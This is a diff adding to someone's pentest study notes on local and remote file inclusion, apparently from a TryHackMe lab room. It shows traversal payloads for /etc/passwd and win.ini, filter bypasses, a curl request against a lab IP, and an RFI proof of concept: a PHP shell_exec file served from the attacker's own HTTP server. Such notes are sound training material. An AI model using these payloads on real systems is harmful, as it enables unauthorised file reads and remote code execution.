@@ -106,9 +106,24 @@ $ ./enum4linux.pl <options> <ip>
     * `....//` (bypass filter with `../` as PHP will not replace the output)
     * it's also possible that the dev force the files to be in a folder, but we simply need to make a path starting with this folder then
   * Remote File Inclusion (RFI)
+    * inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on
   * Path/Directory traversal: manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory
     * file_get_contents in PHP
     * ../[...]/etc/passwd (dot-dot-slash attack)
     * ../[...]/windows/win.ini
     * It may be worth noting that the root, it its own parent, so if you don't know the path of the server, you can still get add way more "../" than needed, and add a path starting from the root.
     * https://tryhackme.com/room/fileinc (common files)
+* https://tryhackme.com/room/fileinc > Remediation
+* https://tryhackme.com/room/fileinc > Common steps
+* https://tryhackme.com/room/fileinc
+  * curl 'http://10.10.187.94/challenges/chall1.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'file=/etc/flag1' 
+  * Cookie, with a username, but it could be a file instead (:
+  * The server uses $_REQUEST, so even if $_GET is filtered, we can get in, but it's kinda special for a setting
+  * python -m http.server
+  * http://10.13.3.244:8000/file
+
+```php
+<?php
+
+echo shell_exec("hostname");
+```
